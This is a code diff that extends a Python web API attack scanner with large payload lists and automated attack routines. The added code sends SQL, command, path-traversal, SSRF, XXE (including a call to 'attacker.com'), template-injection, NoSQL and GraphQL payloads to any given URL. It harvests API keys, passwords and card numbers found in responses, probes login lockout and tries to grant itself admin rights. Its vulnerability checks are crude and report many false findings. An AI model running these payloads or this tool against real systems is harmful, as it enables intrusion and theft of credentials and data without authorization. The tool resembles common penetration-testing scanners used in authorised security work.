@@ -1,8 +1,18 @@
+#!/usr/bin/env python3
+"""
+Advanced API Security Tester
+A comprehensive tool to test APIs for security vulnerabilities with advanced techniques
+"""
+
 import requests
 import json
 import sys
+import time
 import re
+import random
+import string
 import base64
+import xml.etree.ElementTree as ET
 from urllib.parse import urljoin, urlparse, quote, unquote
 
 # Color codes for output
@@ -27,6 +37,8 @@ class AdvancedAPITester:
         self.tested_endpoints = set()
         self.discovered_endpoints = set()
         self.jwt_tokens = []
+        self.api_keys = []
+        self.sensitive_data = []
         
         # Enhanced payload database
         self.payloads = {
@@ -34,54 +46,83 @@ class AdvancedAPITester:
                 "' OR '1'='1", "' UNION SELECT NULL--", "admin'--", "' OR 1=1--", 
                 "1; DROP TABLE users", "1' WAITFOR DELAY '0:0:5'--", 
                 "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-                "1'; EXEC xp_cmdshell('dir')--", "1' OR EXISTS(SELECT * FROM users WHERE username='admin')--"
+                "1'; EXEC xp_cmdshell('dir')--", "1' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
+                "1' OR (SELECT COUNT(*) FROM sysobjects) > 0--", "1' OR (SELECT COUNT(*) FROM information_schema.tables) > 0--"
             ],
             "xss": [
                 "<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>",
                 "javascript:alert('XSS')", "onload=alert('XSS')", 
                 "<img src=x onerror=alert('XSS')>", "{{7*7}}", "${7*7}",
-                "<!--#exec cmd=\"id\"-->", "<svg onload=alert('XSS')>"
+                "<!--#exec cmd=\"id\"-->", "<svg onload=alert('XSS')>",
+                "javascript:confirm('XSS')", "javascript:prompt('XSS')"
             ],
             "path_traversal": [
                 "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                 "....//....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
                 "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
                 "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
-                "/etc/passwd", "c:\\windows\\system32\\drivers\\etc\\hosts"
+                "/etc/passwd", "c:\\windows\\system32\\drivers\\etc\\hosts",
+                "../../../../etc/passwd%00", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00"
             ],
             "cmdi": [
                 "; ls -la", "| whoami", "&& id", "|| ping -c 1 localhost",
                 "`id`", "$(id)", "| dir", "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
-                "; cat /etc/passwd", "| net user"
+                "; cat /etc/passwd", "| net user", "; pwd", "| ipconfig",
+                "&& netstat -an", "; ps aux", "| systeminfo"
             ],
             "idor": [
                 "../user/1", "./admin/../user/2", "user/0", "api/user/1", 
-                "admin/../../user/3", "user/12345", "account/1", "profile/1"
+                "admin/../../user/3", "user/12345", "account/1", "profile/1",
+                "customer/1", "order/1", "invoice/1", "document/1"
             ],
             "ssrf": [
                 "http://localhost:22", "http://127.0.0.1:22", "http://169.254.169.254/latest/meta-data/",
                 "http://localhost:80/admin", "http://127.0.0.1:6379", "http://0.0.0.0:8080",
-                "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stat"
+                "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stat",
+                "http://localhost:9200", "http://127.0.0.1:27017", "http://localhost:5984",
+                "http://169.254.169.254/metadata/instance", "http://metadata.google.internal"
             ],
             "xxe": [
                 "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
                 "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
-                "<!--?xml version=\"1.0\" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><userInfo><firstName>&ent;</firstName></userInfo>"
+                "<!--?xml version=\"1.0\" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><userInfo><firstName>&ent;</firstName></userInfo>",
+                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
             ],
             "ssti": [
                 "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}", 
                 "{{''.__class__.__mro__[1].__subclasses__()}}", 
-                "{{config}}", "{{settings.SECRET_KEY}}"
+                "{{config}}", "{{settings.SECRET_KEY}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
             ],
             "header_injection": [
                 "localhost:80\nX-Forwarded-Host: evil.com",
                 "example.com\r\nX-Forwarded-For: 127.0.0.1",
                 "test.com\r\nHost: evil.com",
-                "api.example.com\nX-Real-IP: 127.0.0.1"
+                "api.example.com\nX-Real-IP: 127.0.0.1",
+                "example.com\r\nReferer: evil.com"
             ],
             "jwt_tampering": [
                 "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                 "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+            ],
+            "nosql_injection": [
+                '{"$where": "this.owner == \'admin\'"}',
+                '{"$gt": ""}',
+                '{"$ne": ""}',
+                '{"$regex": ".*"}',
+                '{"$where": "sleep(5000)"}',
+                '{"username": {"$ne": null}, "password": {"$ne": null}}'
+            ],
+            "graphql_injection": [
+                '{__schema{types{name}}}',
+                'fragment __Type on __Type { name }',
+                'query { __typename }',
+                'mutation { createUser(input: {username: "admin", password: "password"}) { user { id } } }',
+                'query { users { email password } }'
+            ],
+            "prototype_pollution": [
+                '{"__proto__": {"isAdmin": true}}',
+                '{"constructor": {"prototype": {"isAdmin": true}}}',
+                '{"__proto__": {"toString": function() { return "hacked"; }}}'
             ]
         }
     
@@ -99,6 +140,8 @@ class AdvancedAPITester:
             print(f"{Colors.RED}{Colors.BOLD}[VULN] {message}{Colors.END}")
         elif status == "advanced":
             print(f"{Colors.PURPLE}[*] {message}{Colors.END}")
+        elif status == "data":
+            print(f"{Colors.CYAN}[$] {message}{Colors.END}")
     
     def test_endpoint(self, url, method="GET", params=None, headers=None, data=None):
         """Test a single endpoint for vulnerabilities"""
@@ -133,6 +176,9 @@ class AdvancedAPITester:
             # Check for JWT tokens in response
             self.extract_jwt_tokens(response)
             
+            # Check for API keys and sensitive data
+            self.extract_sensitive_data(response, url)
+            
             return response
             
         except requests.exceptions.RequestException as e:
@@ -157,6 +203,48 @@ class AdvancedAPITester:
                     if token not in self.jwt_tokens:
                         self.jwt_tokens.append(token)
                         self.print_status(f"Found JWT token in {header}: {token[:50]}...", "success")
+    
+    def extract_sensitive_data(self, response, url):
+        """Extract API keys and sensitive data from response"""
+        # API key patterns
+        api_key_patterns = {
+            'AWS_ACCESS_KEY': r'AKIA[0-9A-Z]{16}',
+            'AWS_SECRET_KEY': r'[0-9a-zA-Z/+]{40}',
+            'Google_API_KEY': r'AIza[0-9A-Za-z\\-_]{35}',
+            'Google_OAUTH': r'ya29\\.[0-9A-Za-z\\-_]+',
+            'Facebook_ACCESS_TOKEN': r'EAACEdEose0cBA[0-9A-Za-z]+',
+            'Twitter_ACCESS_TOKEN': r'[0-9a-zA-Z]{35,44}',
+            'GitHub_ACCESS_TOKEN': r'ghp_[0-9a-zA-Z]{36}',
+            'Slack_ACCESS_TOKEN': r'xox[baprs]-[0-9a-zA-Z]{10,48}',
+            'Stripe_API_KEY': r'sk_live_[0-9a-zA-Z]{24}',
+            'Twilio_API_KEY': r'SK[0-9a-fA-F]{32}',
+            'Password': r'password[=:]\s*[\'"]?([^\'"\s]+)',
+            'Email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
+            'Credit Card': r'\b(?:\d[ -]*?){13,16}\b',
+            'JWT': r'eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*'
+        }
+        
+        for data_type, pattern in api_key_patterns.items():
+            matches = re.findall(pattern, response.text)
+            for match in matches:
+                if match not in self.sensitive_data:
+                    self.sensitive_data.append({
+                        'type': data_type,
+                        'value': match,
+                        'url': url
+                    })
+                    self.print_status(f"Found {data_type}: {match}", "data")
+        
+        # Check headers for sensitive information
+        for header, value in response.headers.items():
+            if any(keyword in header.lower() for keyword in ['key', 'token', 'secret', 'password', 'credential']):
+                if value and len(value) > 10:  # Basic length check to avoid false positives
+                    self.sensitive_data.append({
+                        'type': f'Header_{header}',
+                        'value': value,
+                        'url': url
+                    })
+                    self.print_status(f"Found sensitive header {header}: {value[:50]}...", "data")
     
     def test_jwt_vulnerabilities(self):
         """Test extracted JWT tokens for vulnerabilities"""
@@ -184,7 +272,7 @@ class AdvancedAPITester:
                 pass
             
             # Test for weak secret key
-            weak_secrets = ["secret", "password", "123456", "qwerty", "admin", "test", "key"]
+            weak_secrets = ["secret", "password", "123456", "qwerty", "admin", "test", "key", "changeme"]
             for secret in weak_secrets:
                 try:
                     import jwt
@@ -299,6 +387,18 @@ class AdvancedAPITester:
             })
             self.print_status(f"XXE vulnerability found at {url}", "vuln")
         
+        # NoSQL Injection detection
+        if any(indicator in text for indicator in ["mongodb", "mongoose", "nosql", "mongodb error"]) and any(payload in str(params or data) for payload in self.payloads["nosql_injection"]):
+            self.vulnerabilities.append({
+                "type": "NoSQL Injection",
+                "url": url,
+                "method": method,
+                "params": params or data,
+                "evidence": "NoSQL injection payload executed",
+                "severity": "High"
+            })
+            self.print_status(f"NoSQL Injection vulnerability found at {url}", "vuln")
+        
         # Open Redirect detection
         if response.status_code in [301, 302, 307, 308] and "location" in response.headers:
             location = response.headers["location"]
@@ -347,7 +447,10 @@ class AdvancedAPITester:
             "/oauth/token", "/oauth/authorize", "/.well-known/openid-configuration",
             "/actuator", "/actuator/health", "/metrics", "/debug", "/console",
             "/phpmyadmin", "/adminer", "/wp-admin", "/wp-json", "/_api", "/_admin",
-            "/_console", "/_debug", "/_phpinfo", "/info.php", "/test.php"
+            "/_console", "/_debug", "/_phpinfo", "/info.php", "/test.php",
+            "/backup", "/backups", "/db", "/database", "/config", "/configuration",
+            "/env", "/environment", "/logs", "/api-docs", "/swagger-ui", "/swagger.json",
+            "/graphiql", "/voyager", "/altair", "/playground"
         ]
         
         discovered = []
@@ -375,7 +478,7 @@ class AdvancedAPITester:
                 pass
         
         # Try common file extensions
-        extensions = [".json", ".xml", ".yaml", ".yml", ".php", ".asp", ".aspx", ".jsp"]
+        extensions = [".json", ".xml", ".yaml", ".yml", ".php", ".asp", ".aspx", ".jsp", ".txt", ".bak", ".old", ".backup"]
         for ext in extensions:
             test_url = urljoin(base_url, f"/api{ext}")
             try:
@@ -385,6 +488,25 @@ class AdvancedAPITester:
                     self.print_status(f"Found endpoint: {test_url}", "success")
             except:
                 pass
+        
+        # Try common API patterns
+        api_patterns = [
+            "/api/{id}", "/users/{id}", "/products/{id}", "/v1/{resource}",
+            "/v2/{resource}", "/{version}/users", "/{version}/products"
+        ]
+        
+        # Test with common IDs
+        test_ids = ["1", "123", "test", "admin", "user", "guest"]
+        for pattern in api_patterns:
+            for test_id in test_ids:
+                test_url = urljoin(base_url, pattern.replace("{id}", test_id).replace("{resource}", "test").replace("{version}", "v1"))
+                try:
+                    response = self.session.get(test_url, timeout=5)
+                    if response.status_code < 400:
+                        discovered.append(test_url)
+                        self.print_status(f"Found endpoint: {test_url}", "success")
+                except:
+                    pass
         
         return discovered
     
@@ -447,6 +569,24 @@ class AdvancedAPITester:
                             "severity": "Medium"
                         })
                         self.print_status(f"Username enumeration possible for {username} at {test_url}", "vuln")
+                except:
+                    pass
+            
+            # Test for account lockout
+            for i in range(10):
+                try:
+                    response = self.session.post(test_url, json={"username": "admin", "password": f"wrong_password_{i}"}, timeout=5)
+                    if "locked" in response.text.lower() or "try again later" in response.text.lower():
+                        self.vulnerabilities.append({
+                            "type": "Account Lockout",
+                            "url": test_url,
+                            "method": "POST",
+                            "params": {"attempts": i+1},
+                            "evidence": f"Account lockout after {i+1} attempts",
+                            "severity": "Low"
+                        })
+                        self.print_status(f"Account lockout detected at {test_url} after {i+1} attempts", "vuln")
+                        break
                 except:
                     pass
     
@@ -600,6 +740,100 @@ class AdvancedAPITester:
                     except:
                         pass
     
+    def test_nosql_injection(self, base_url):
+        """Test for NoSQL injection vulnerabilities"""
+        self.print_status("Testing for NoSQL injection vulnerabilities", "advanced")
+        
+        # Look for endpoints that might use NoSQL databases
+        nosql_endpoints = [
+            "/api/users", "/api/login", "/api/auth", "/api/products",
+            "/users", "/login", "/auth", "/products"
+        ]
+        
+        for endpoint in nosql_endpoints:
+            test_url = urljoin(base_url, endpoint)
+            
+            for payload in self.payloads["nosql_injection"]:
+                try:
+                    # Test with JSON payload
+                    response = self.session.post(test_url, json=json.loads(payload), timeout=10)
+                    
+                    # Check for signs of NoSQL injection
+                    if response.status_code == 200 and ("admin" in response.text or "password" in response.text):
+                        self.vulnerabilities.append({
+                            "type": "NoSQL Injection",
+                            "url": test_url,
+                            "method": "POST",
+                            "params": {"payload": payload},
+                            "evidence": "NoSQL injection payload executed",
+                            "severity": "High"
+                        })
+                        self.print_status(f"NoSQL Injection vulnerability found at {test_url}", "vuln")
+                except:
+                    pass
+    
+    def test_graphql_injection(self, base_url):
+        """Test for GraphQL injection vulnerabilities"""
+        self.print_status("Testing for GraphQL injection vulnerabilities", "advanced")
+        
+        # Test GraphQL endpoints
+        graphql_endpoints = [
+            "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
+            "/gql", "/api/gql", "/query", "/api/query"
+        ]
+        
+        for endpoint in graphql_endpoints:
+            test_url = urljoin(base_url, endpoint)
+            
+            for payload in self.payloads["graphql_injection"]:
+                try:
+                    response = self.session.post(test_url, json={"query": payload}, timeout=10)
+                    
+                    # Check for signs of GraphQL injection
+                    if response.status_code == 200 and ("__schema" in response.text or "users" in response.text):
+                        self.vulnerabilities.append({
+                            "type": "GraphQL Injection",
+                            "url": test_url,
+                            "method": "POST",
+                            "params": {"query": payload},
+                            "evidence": "GraphQL injection payload executed",
+                            "severity": "High"
+                        })
+                        self.print_status(f"GraphQL Injection vulnerability found at {test_url}", "vuln")
+                except:
+                    pass
+    
+    def test_prototype_pollution(self, base_url):
+        """Test for Prototype Pollution vulnerabilities"""
+        self.print_status("Testing for Prototype Pollution vulnerabilities", "advanced")
+        
+        # Test endpoints that accept JSON
+        json_endpoints = [
+            "/api/users", "/api/products", "/api/config", "/api/settings",
+            "/users", "/products", "/config", "/settings"
+        ]
+        
+        for endpoint in json_endpoints:
+            test_url = urljoin(base_url, endpoint)
+            
+            for payload in self.payloads["prototype_pollution"]:
+                try:
+                    response = self.session.post(test_url, json=json.loads(payload), timeout=10)
+                    
+                    # Check for signs of prototype pollution
+                    if response.status_code == 200 and ("isAdmin" in response.text or "toString" in response.text):
+                        self.vulnerabilities.append({
+                            "type": "Prototype Pollution",
+                            "url": test_url,
+                            "method": "POST",
+                            "params": {"payload": payload},
+                            "evidence": "Prototype pollution payload executed",
+                            "severity": "High"
+                        })
+                        self.print_status(f"Prototype Pollution vulnerability found at {test_url}", "vuln")
+                except:
+                    pass
+    
     def fuzz_parameters(self, url):
         """Fuzz parameters with advanced payloads"""
         self.print_status(f"Fuzzing parameters for {url}", "info")
@@ -686,6 +920,79 @@ class AdvancedAPITester:
                 except:
                     pass
     
+    def test_broken_object_level_auth(self, base_url):
+        """Test for Broken Object Level Authorization vulnerabilities"""
+        self.print_status("Testing for BOLA vulnerabilities", "advanced")
+        
+        # Test endpoints with ID parameters
+        id_endpoints = [
+            "/api/users/", "/users/", "/api/products/", "/products/",
+            "/api/orders/", "/orders/", "/api/invoices/", "/invoices/"
+        ]
+        
+        test_ids = ["1", "2", "123", "admin", "test"]
+        
+        for endpoint in id_endpoints:
+            for test_id in test_ids:
+                test_url = urljoin(base_url, endpoint + test_id)
+                try:
+                    response = self.session.get(test_url, timeout=10)
+                    
+                    # Check if we can access other users' data
+                    if response.status_code == 200 and any(indicator in response.text for indicator in ["email", "password", "admin", "user"]):
+                        self.vulnerabilities.append({
+                            "type": "Broken Object Level Authorization",
+                            "url": test_url,
+                            "method": "GET",
+                            "params": {"id": test_id},
+                            "evidence": "Access to object without proper authorization",
+                            "severity": "High"
+                        })
+                        self.print_status(f"BOLA vulnerability found at {test_url}", "vuln")
+                except:
+                    pass
+    
+    def test_mass_assignment(self, base_url):
+        """Test for Mass Assignment vulnerabilities"""
+        self.print_status("Testing for Mass Assignment vulnerabilities", "advanced")
+        
+        # Test endpoints that might be vulnerable to mass assignment
+        mass_assignment_endpoints = [
+            "/api/users", "/users", "/api/products", "/products",
+            "/api/register", "/register", "/api/profile", "/profile"
+        ]
+        
+        # Test with common admin parameters
+        admin_params = {
+            "isAdmin": True,
+            "admin": True,
+            "role": "admin",
+            "permissions": "all",
+            "is_active": True,
+            "is_superuser": True
+        }
+        
+        for endpoint in mass_assignment_endpoints:
+            test_url = urljoin(base_url, endpoint)
+            
+            try:
+                # Test with POST request
+                response = self.session.post(test_url, json=admin_params, timeout=10)
+                
+                # Check if we successfully set admin parameters
+                if response.status_code == 200 and any(indicator in response.text for indicator in ["admin", "true", "superuser"]):
+                    self.vulnerabilities.append({
+                        "type": "Mass Assignment",
+                        "url": test_url,
+                        "method": "POST",
+                        "params": admin_params,
+                        "evidence": "Admin parameters accepted without authorization",
+                        "severity": "High"
+                    })
+                    self.print_status(f"Mass Assignment vulnerability found at {test_url}", "vuln")
+            except:
+                pass
+    
     def scan(self, target_url):
         """Main scanning function"""
         self.print_status(f"Starting advanced scan of {target_url}", "info")
@@ -710,11 +1017,26 @@ class AdvancedAPITester:
         # Test SSTI
         self.test_ssti(target_url)
         
+        # Test NoSQL Injection
+        self.test_nosql_injection(target_url)
+        
+        # Test GraphQL Injection
+        self.test_graphql_injection(target_url)
+        
+        # Test Prototype Pollution
+        self.test_prototype_pollution(target_url)
+        
         # Test rate limiting
         self.test_rate_limiting(target_url)
         
         # Test HTTP methods
         self.test_http_methods(target_url)
+        
+        # Test BOLA
+        self.test_broken_object_level_auth(target_url)
+        
+        # Test Mass Assignment
+        self.test_mass_assignment(target_url)
         
         # Test each endpoint with different HTTP methods
         for endpoint in endpoints:
@@ -780,6 +1102,17 @@ class AdvancedAPITester:
             if vuln.get('params'):
                 print(f"   Parameters: {vuln['params']}")
             print(f"   Evidence: {vuln['evidence']}")
+        
+        # Print sensitive data findings
+        if self.sensitive_data:
+            print(f"\n{Colors.CYAN}{'='*80}{Colors.END}")
+            print(f"{Colors.CYAN}{Colors.BOLD}SENSITIVE DATA FINDINGS{Colors.END}")
+            print(f"{Colors.CYAN}{'='*80}{Colors.END}")
+            
+            for i, data in enumerate(self.sensitive_data, 1):
+                print(f"\n{Colors.CYAN}{i}. {data['type']}{Colors.END}")
+                print(f"   URL: {data['url']}")
+                print(f"   Value: {data['value'][:100]}{'...' if len(data['value']) > 100 else ''}")
 
 def main():
     if len(sys.argv) != 2:
